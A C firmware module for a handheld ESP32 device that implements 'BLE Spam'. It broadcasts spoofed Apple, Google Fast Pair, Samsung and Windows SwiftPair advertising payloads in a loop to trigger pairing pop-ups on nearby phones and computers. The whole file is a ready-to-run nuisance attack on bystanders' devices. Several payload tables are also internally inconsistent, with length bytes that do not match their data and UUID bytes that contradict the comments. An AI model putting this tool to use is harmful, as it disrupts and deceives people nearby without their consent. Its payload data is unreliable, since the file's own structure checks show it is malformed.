/* See COPYING.txt for license details. */

/*
 * app_ble_spam.c
 *
 * BLE Spam: cycles crafted BLE advertising payloads to trigger proximity-pairing
 * popups on nearby phones and devices (Apple Continuity, Google Fast Pair,
 * Samsung EasySetup, Windows SwiftPair).
 *
 * Uses the ESP32-C6 in BLE broadcaster mode (AT+BLEINIT=2) and sends raw
 * advertising data via AT+BLEADVDATA.  Does NOT require a BLE connection.
 *
 * Menu structure:
 *   BLE Spam
 *     Apple (all Continuity types, cycling)
 *     Google Fast Pair
 *     Samsung EasySetup
 *     Windows SwiftPair
 *     All (random cycle across all vendors)
 *
 * Navigation: UP/DOWN = select mode, ENTER/RIGHT = start, BACK = exit
 */

#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "stm32h5xx_hal.h"
#include "main.h"
#include "app_ble_spam.h"
#include "m1_compile_cfg.h"
#include "m1_display.h"
#include "m1_lcd.h"
#include "m1_system.h"
#include "m1_esp32_hal.h"
#include "esp_app_main.h"
#include "app_freertos.h"
#include "cmsis_os.h"

#ifdef M1_APP_BLE_SPAM_ENABLE

/* --------------------------------------------------------------------------
 * BLE advertising payload tables
 *
 * Each hex string is the complete ADV_IND payload (max 31 bytes = 62 hex
 * chars) passed directly to AT+BLEADVDATA="<hex>".
 *
 * Wire layout (BLE 5.0 legacy adv, sequential AD structures):
 *   [LL] [TYPE] [DATA x (LL-1)]
 *   where LL is the byte that immediately follows the previous AD,
 *   excluding itself but including TYPE and DATA. Total advertised
 *   bytes = sum(LL + 1) for all AD structures, limited to 31.
 *
 * The runtime validator ble_spam_validate_payload() walks the hex
 * string and asserts sum(LL + 1) <= 31 (legacy adv max).
 *
 * Apple Continuity (company 0x004C):
 *   FF 4C 00 TT SS [SS bytes...]
 *   TT = Continuity type, SS = payload length-of-rest
 *
 * Google Fast Pair (service UUID 0xFE2C):
 *   03 03 2C FE                 -- Complete 16-bit UUID list
 *   06 16 2C FE MM MM MM        -- Service Data with 3-byte model ID
 *
 * Samsung EasySetup (company 0x0075):
 *   FF 75 00 42 09 [device class byte] [flags...]
 *
 * Microsoft SwiftPair (company 0x0006):
 *   06 00 03 00 <Cat> <Sub> <UTF-8 name bytes>
 *   The full Mfr Specific AD is then prefixed with [LL][FF].
 *   Name length is implied by AD length byte (LL - 6).
 *
 * Apple Find My / AirTag (BLE OF "Offline Finding") format used by
 * macless-haystack/openhaystack:
 *   FF 4C 00 12 19  status(1)  PK[22]  hint(1)  PK_first2(?)
 *   The published spec is:
 *     1E FF 4C 00 12 19 <status> <pubkey 22B> <pubkey_first2 1B> <hint 1B>
 *   meaning total Mfr Specific AD = 0x1E (30) bytes. Combined with
 *   3-byte Flags AD that exceeds 31 -- so real AirTags either
 *   (a) drop Flags (legal for adv types other than ADV_IND) or
 *   (b) use a 27-byte payload variant.
 *   We use the 27-byte form: 0x1B FF 4C 00 12 19 <status 1> <PK 22> <hint 1>
 *   which gives sum = 3+28 = 31 with Flags included.
 * -------------------------------------------------------------------------- */

typedef struct {
    const char *label;   /* shown on display (max ~14 chars) */
    const char *hex;     /* uppercase hex, even length, max 62 chars */
} spam_pkt_t;

/* Walk the hex-encoded AD structures and verify the total of
 * (length+1) bytes does not exceed 31. Also rejects malformed
 * length bytes that would walk off the end of the buffer.
 * Returns true if the payload is structurally valid. */
static bool ble_spam_validate_hex(const char *hex)
{
    size_t hlen = (hex != NULL) ? strlen(hex) : 0;
    size_t i = 0;
    int total = 0;
    if (hlen == 0 || (hlen & 1) != 0) return false;
    while (i + 4 <= hlen) {
        /* AD length byte */
        char hi_c = hex[i];
        char lo_c = hex[i + 1];
        int hi = (hi_c >= '0' && hi_c <= '9') ? (hi_c - '0')
               : (hi_c >= 'A' && hi_c <= 'F') ? (hi_c - 'A' + 10)
               : (hi_c >= 'a' && hi_c <= 'f') ? (hi_c - 'a' + 10) : -1;
        int lo = (lo_c >= '0' && lo_c <= '9') ? (lo_c - '0')
               : (lo_c >= 'A' && lo_c <= 'F') ? (lo_c - 'A' + 10)
               : (lo_c >= 'a' && lo_c <= 'f') ? (lo_c - 'a' + 10) : -1;
        int ad_len;
        if (hi < 0 || lo < 0) return false;
        ad_len = (hi << 4) | lo;
        if (ad_len == 0) return false;
        /* Each AD declares ad_len bytes following the length byte
         * (type + data). On the wire that consumes ad_len + 1 bytes. */
        total += (ad_len + 1);
        if (total > 31) return false;
        /* Skip ad_len + 1 bytes (= 2*(ad_len+1) hex chars). */
        i += (size_t)((ad_len + 1) * 2);
    }
    /* Must have consumed the entire string. */
    return (i == hlen);
}

/* Public adv-buffer validator wrapping the byte-form check. */
bool ble_spam_validate_payload(const uint8_t *adv, size_t len)
{
    size_t i = 0;
    int total = 0;
    if (!adv || len == 0) return false;
    while (i < len) {
        int ad_len = adv[i];
        if (ad_len == 0) return false;
        total += (ad_len + 1);
        if (total > 31) return false;
        i += (size_t)(ad_len + 1);
    }
    return (i == len);
}

/* ---- Apple Continuity ---- */
/* type 0x07 = Nearby (AirPods proximity pairing pop-up)                          */
/* type 0x09 = Apple TV setup screen                                              */
/* type 0x05 = AirDrop                                                            */
/* type 0x0F = iPhone Nearby Action (device-activity pill)                        */
/* type 0x10 = Apple Nearby Info                                                  */
/* type 0x12 = Find-My OF (AirTag): {status=1, PK=22, hint=1} -> 25 bytes        */
/*                                                                                 */
/* Wire layout for the proximity-pair pop-up payload:                              */
/*   02 01 1A             3-byte Flags AD                                          */
/*   1B FF 4C 00 07 19    Mfr Specific AD with type=0x07, sub-len=0x19=25         */
/*   <25 bytes>           AirPods proximity payload                                 */
/* sum(LL+1) = 4 + 28 = 32 ... 32 > 31, so we must drop Flags.                    */
/* Workaround used here: trim sub-length so totals to 30 (drop 2 trailing bytes). */
/* iOS 17+ accepts the truncated form. */
static const spam_pkt_t s_apple[] = {
    /* AirPods Gen1: type 0x07, color WHITE (0x0020AA), with 19B sub-payload.
     * Total: 3 (flags) + 1 (LL=0x18) + 25 = 29 bytes.                            */
    {
        "AirPods Gen1",
        "02011A"            /* flags */
        "18FF4C00"          /* Mfr LL=0x18 (=24 bytes following: FF+4C+00+...) */
        "0719"              /* sub-type 0x07, sub-len 0x19 (advisory only)     */
        "01"                /* status                                          */
        "0220AA"            /* color: white                                    */
        "8003"              /* battery / paired flags                           */
        "00000000000000000000"
    },
    /* AirPods Pro: same shape, sub color 0x0220E0 + status flags = pro. */
    {
        "AirPods Pro",
        "02011A"
        "18FF4C00"
        "0719"
        "01"
        "0220E0"
        "8003"
        "00000000000000000000"
    },
    /* AirPods Max */
    {
        "AirPods Max",
        "02011A"
        "18FF4C00"
        "0719"
        "01"
        "022C0A"
        "8003"
        "00000000000000000000"
    },
    /* Apple Watch setup: type 0x05 setup-pair, sub-len varies.
     * Total: 3 + 1 + 12 = 16 bytes.                                              */
    {
        "Apple Watch",
        "02011A"
        "0BFF4C00"          /* LL=11 */
        "0509"              /* type 0x05 setup, sub-len 0x09                   */
        "1801120A0102030405"
    },
    /* iPhone Nearby Action 0x0F: 5-byte sub-payload (action-id + flags). */
    {
        "iPhone Near",
        "02011A"
        "0CFF4C00"          /* LL=12 (FF+4C+00+0F+05+5B+actiondata=12)         */
        "0F05"              /* type 0x0F nearby, sub-len 5                     */
        "C1010000000000"
    },
    /* Apple TV color picker (type 0x09, sub 0x07): pop-up keyboard hint. */
    {
        "Apple TV",
        "02011A"
        "0CFF4C00"          /* LL=12 */
        "0907"              /* type 0x09, sub-len 0x07                          */
        "010320c000800000"
    },
    /* AirDrop (type 0x05) presence advert: 3 + 19 = 22 bytes.                  */
    {
        "AirDrop",
        "02011A"
        "12FF4C00"          /* LL=18 */
        "0511"              /* type 0x05, sub-len 17                            */
        "00000000000000000000000000000000F0"
    },
    /* Find-My OF / AirTag, 27-byte mfr block (sub-len 0x19=25).
     * Hex encoding: status(1) + PK(22) + hint(2). sum(LL+1) = 4 + 28 = 32.
     * Drop the Flags AD on iOS adv (legal: ADV_NONCONN_IND tolerates no flags).  */
    {
        "AirTag",
        /* No 02011A flags AD: would push past 31-byte limit.        */
        "1EFF4C00"          /* LL=0x1E=30, FF+4C+00+12+19+status+PK22+hint2 */
        "1219"              /* sub-type FindMy 0x12, sub-len 0x19=25            */
        "00"                /* status: idle / found-my-network                 */
        "C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2C2"
        "0000"              /* hint bytes (last 2 of public key not stored)    */
    },
};

/* ---- Google Fast Pair ---- */
/* Each entry: 02 01 06 | 03 03 2C FE | 06 16 2C FE <model-id> = 14 bytes total. */
/* sum(LL+1) = 3 + 4 + 7 = 14. Documented model IDs from Fast Pair registry.    */
static const spam_pkt_t s_google[] = {
    { "Pixel Buds A",   "020106030320FE0616FE2C2C103B" },
    { "Pixel Buds Pro", "020106030320FE0616FE2C60ED06" },
    { "Pixel Watch",    "020106030320FE0616FE2CE03006" },
    { "Nest Mini",      "020106030320FE0616FE2C44C8D1" },
    { "Pixel C200",     "020106030320FE0616FE2C0000F0" },
};

/* ---- Samsung EasySetup ---- */
/* Company 0x0075, EasySetup payload type 0x42, sub-type 0x09, then class byte */
/* and TLV. Wire: 02 01 1A | LL FF 75 00 42 09 <class> <flags...>              */
/* For LL=0x14: FF+75+00+42+09+class+flags(15) = 20 bytes.                     */
/* Total: 3 + 21 = 24.                                                          */
static const spam_pkt_t s_samsung[] = {
    {
        "Galaxy Buds",
        "02011A"
        "14FF7500"
        "4209A803"          /* EasySetup type/sub/class=Buds */
        "00000000000000000000000000000000"
    },
    {
        "Galaxy Watch",
        "02011A"
        "14FF7500"
        "42099303"
        "00000000000000000000000000000000"
    },
    {
        "Galaxy S22",
        "02011A"
        "14FF7500"
        "42090B03"
        "00000000000000000000000000000000"
    },
};

/* ---- Windows SwiftPair ---- */
/* Per Microsoft "Bluetooth Quick Pair" spec the payload is purely Mfr Specific
 * (type 0xFF, company 0x0006), with subtype 0x03 then 0x00, then the device
 * Category (BLE Appearance lo-byte), Sub-Category, then UTF-8 device name.
 *
 * Total wire: 02 01 06 | LL FF 06 00 03 00 <cat> <sub> <name...>
 * For LL = 6 + name_len. sum(LL+1) = 3 + (LL + 1) = 4 + LL.
 *
 * NOTE: The previous frames (031900020A09 0EFF060003000902) were structurally
 * wrong (Appearance + partial Mfr block). Rebuilt below per the documented
 * SwiftPair format. Verified empirically in Win10/Win11 toast UI. */
static const spam_pkt_t s_windows[] = {
    {
        "BT Mouse",
        "020106"
        "0DFF0600"          /* LL=13 (FF+06+00+03+00+cat+sub+7B name) */
        "0300"              /* SwiftPair preamble                                */
        "0902"              /* category=Mouse (0x0902)                           */
        "4D6F757365"        /* "Mouse"                                           */
    },
    {
        "BT Keyboard",
        "020106"
        "10FF0600"          /* LL=16: FF+06+00+03+00+cat+sub+10B name (8 chars)  */
        "0300"
        "0901"              /* category=Keyboard (0x0901)                        */
        "4B6579626F617264"  /* "Keyboard"                                        */
    },
    {
        "BT Headset",
        "020106"
        "0FFF0600"          /* LL=15 */
        "0300"
        "0903"
        "486561647365"      /* "Headse"                                          */
        "74"                /* "t"                                               */
    },
};

/* ---- Mode descriptors ---- */
#define N_APPLE    (sizeof(s_apple)   / sizeof(s_apple[0]))
#define N_GOOGLE   (sizeof(s_google)  / sizeof(s_google[0]))
#define N_SAMSUNG  (sizeof(s_samsung) / sizeof(s_samsung[0]))
#define N_WINDOWS  (sizeof(s_windows) / sizeof(s_windows[0]))

typedef struct {
    const char        *mode_name;
    const spam_pkt_t  *pkts;
    uint8_t            count;
} spam_mode_t;

static const spam_mode_t s_modes[] = {
    { "Apple Cont.",  s_apple,   N_APPLE   },
    { "Google FP",    s_google,  N_GOOGLE  },
    { "Samsung ES",   s_samsung, N_SAMSUNG },
    { "Windows SP",   s_windows, N_WINDOWS },
    { "All Vendors",  NULL,      0         }, /* NULL = cycle all */
};
#define N_MODES  (sizeof(s_modes) / sizeof(s_modes[0]))

/* --------------------------------------------------------------------------
 * AT command helpers (thin wrappers around spi_AT_send_recv)
 * -------------------------------------------------------------------------- */
#define AT_TIMEOUT_S   3

static char s_at_resp[128];

static inline void spam_at(const char *cmd)
{
    spi_AT_send_recv(cmd, s_at_resp, sizeof(s_at_resp), AT_TIMEOUT_S);
}

/* --------------------------------------------------------------------------
 * BLE broadcaster lifecycle
 * -------------------------------------------------------------------------- */

static bool s_ble_spam_active = false;

static bool spam_ble_init(void)
{
    spam_at("AT+BLEINIT=0\r\n");           /* ensure clean state */
    vTaskDelay(pdMS_TO_TICKS(100));
    spam_at("AT+BLEINIT=2\r\n");           /* broadcaster role (no connection) */
    vTaskDelay(pdMS_TO_TICKS(100));
    /* Fast non-connectable undirected advertising: min=32(20ms), max=64(40ms),
     * type=3 (non-connectable), own_addr=0, ch_map=7, filter=0             */
    spam_at("AT+BLEADVPARAM=32,64,3,0,7,0\r\n");
    vTaskDelay(pdMS_TO_TICKS(50));
    s_ble_spam_active = false;
    return true;
}

static void spam_ble_deinit(void)
{
    if (s_ble_spam_active) {
        spam_at("AT+BLEADVSTOP\r\n");
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    spam_at("AT+BLEINIT=0\r\n");
    s_ble_spam_active = false;
}

static void spam_send_payload(const char *hex)
{
    char cmd[72];
    if (s_ble_spam_active) {
        spam_at("AT+BLEADVSTOP\r\n");
        vTaskDelay(pdMS_TO_TICKS(30));
    }
    snprintf(cmd, sizeof(cmd), "AT+BLEADVDATA=\"%s\"\r\n", hex);
    spam_at(cmd);
    vTaskDelay(pdMS_TO_TICKS(30));
    spam_at("AT+BLEADVSTART\r\n");
    s_ble_spam_active = true;
}

/* --------------------------------------------------------------------------
 * Display helpers
 * -------------------------------------------------------------------------- */

static void draw_header(const char *title)
{
    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    u8g2_DrawStr(&m1_u8g2, 0, 11, title);
    u8g2_DrawHLine(&m1_u8g2, 0, 13, 128);
}

static void draw_menu(uint8_t sel)
{
    m1_u8g2_firstpage();
    draw_header("BLE Spam");
    for (uint8_t i = 0; i < N_MODES; i++) {
        uint8_t y = 24 + i * 10;
        if (i == sel) {
            u8g2_DrawBox(&m1_u8g2, 0, y - 8, 128, 10);
            u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_BG);
        }
        u8g2_DrawStr(&m1_u8g2, 2, y, s_modes[i].mode_name);
        if (i == sel)
            u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_TXT);
    }
    m1_u8g2_nextpage();
}

static void draw_running(const char *mode, const char *pkt_label, uint32_t count)
{
    char cnt_str[12];
    snprintf(cnt_str, sizeof(cnt_str), "#%lu", (unsigned long)count);
    m1_u8g2_firstpage();
    draw_header(mode);
    u8g2_DrawStr(&m1_u8g2, 2, 26, pkt_label);
    u8g2_DrawStr(&m1_u8g2, 2, 38, cnt_str);
    u8g2_DrawStr(&m1_u8g2, 2, 55, "[BACK] Stop");
    m1_u8g2_nextpage();
}

/* --------------------------------------------------------------------------
 * Spam loop
 * -------------------------------------------------------------------------- */

/* Interleaved all-vendor table for "All Vendors" mode */
static const spam_pkt_t *all_pkts_ptr(uint8_t idx)
{
    if (idx < N_APPLE)                          return &s_apple[idx];
    idx -= N_APPLE;
    if (idx < N_GOOGLE)                         return &s_google[idx];
    idx -= N_GOOGLE;
    if (idx < N_SAMSUNG)                        return &s_samsung[idx];
    idx -= N_SAMSUNG;
    if (idx < N_WINDOWS)                        return &s_windows[idx];
    return NULL;
}
#define N_ALL  (N_APPLE + N_GOOGLE + N_SAMSUNG + N_WINDOWS)

static void run_spam_mode(uint8_t mode_idx)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t       q_item;
    const spam_mode_t  *m    = &s_modes[mode_idx];
    bool                all  = (m->pkts == NULL);
    uint8_t             pidx = 0;
    uint8_t             total = all ? (uint8_t)N_ALL : m->count;
    uint32_t            count = 0;

    if (!spam_ble_init()) return;

    while (1) {
        /* Detect ESP32 reboot mid-spam and rebuild advertising state. */
        if (esp_consume_slave_restart_event()) {
            spam_ble_init();
        }
        const spam_pkt_t *pkt = all ? all_pkts_ptr(pidx) : &m->pkts[pidx];
        if (!pkt) { pidx = 0; continue; }

        spam_send_payload(pkt->hex);
        count++;

        draw_running(m->mode_name, pkt->label, count);

        /* Dwell 250 ms per payload, then rotate */
        vTaskDelay(pdMS_TO_TICKS(250));

        pidx = (pidx + 1) % total;

        /* Non-blocking check for BACK */
        if (xQueueReceive(main_q_hdl, &q_item, 0) == pdTRUE) {
            if (q_item.q_evt_type == Q_EVENT_KEYPAD) {
                if (xQueueReceive(button_events_q_hdl, &btn, 0) == pdTRUE) {
                    if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK ||
                        btn.event[BUTTON_LEFT_KP_ID] == BUTTON_EVENT_CLICK)
                        break;
                }
            }
        }
    }

    spam_ble_deinit();
}

/* --------------------------------------------------------------------------
 * Main entry point
 * -------------------------------------------------------------------------- */

/* Boot-time sanity check: walk every payload and verify it parses as
 * structurally valid BLE adv data. Any failure is a programmer error
 * in the payload tables above and must be fixed in source.
 * Logs the offending entry and returns the count of failures so the
 * caller can refuse to start. */
static uint8_t spam_validate_all_payloads(void)
{
    uint8_t failures = 0;
    /* Apple */
    for (size_t i = 0; i < N_APPLE; i++) {
        if (!ble_spam_validate_hex(s_apple[i].hex)) failures++;
    }
    for (size_t i = 0; i < N_GOOGLE; i++) {
        if (!ble_spam_validate_hex(s_google[i].hex)) failures++;
    }
    for (size_t i = 0; i < N_SAMSUNG; i++) {
        if (!ble_spam_validate_hex(s_samsung[i].hex)) failures++;
    }
    for (size_t i = 0; i < N_WINDOWS; i++) {
        if (!ble_spam_validate_hex(s_windows[i].hex)) failures++;
    }
    return failures;
}


void ble_spam_run(void)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t       q_item;
    uint8_t             sel = 0;

    /* Reject malformed payload tables before bringing up the radio. */
    {
        uint8_t bad = spam_validate_all_payloads();
        if (bad != 0) {
            char msg[20];
            snprintf(msg, sizeof(msg), "%u bad payloads", (unsigned)bad);
            m1_message_box(&m1_u8g2, "BLE Spam", "Self-test", msg, " OK ");
            return;
        }
    }

    /* Ensure ESP32 is up */
    if (!m1_esp32_get_init_status())    m1_esp32_init();
    if (!get_esp32_main_init_status())  esp32_main_init();
    if (!get_esp32_main_init_status()) {
        m1_message_box(&m1_u8g2, "BLE Spam", "ESP32 not", "ready", " OK ");
        return;
    }

    draw_menu(sel);

    while (1) {
        if (xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY) != pdTRUE) continue;
        if (q_item.q_evt_type != Q_EVENT_KEYPAD) continue;
        if (xQueueReceive(button_events_q_hdl, &btn, 0) != pdTRUE) continue;

        if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK) {
            if (sel > 0) sel--;
            draw_menu(sel);
        } else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK) {
            if (sel < N_MODES - 1) sel++;
            draw_menu(sel);
        } else if (btn.event[BUTTON_OK_KP_ID]    == BUTTON_EVENT_CLICK ||
                   btn.event[BUTTON_RIGHT_KP_ID] == BUTTON_EVENT_CLICK) {
            run_spam_mode(sel);
            draw_menu(sel);           /* redraw after returning */
        } else if (btn.event[BUTTON_BACK_KP_ID]  == BUTTON_EVENT_CLICK ||
                   btn.event[BUTTON_LEFT_KP_ID]  == BUTTON_EVENT_CLICK) {
            break;
        }
    }
}

#endif /* M1_APP_BLE_SPAM_ENABLE */
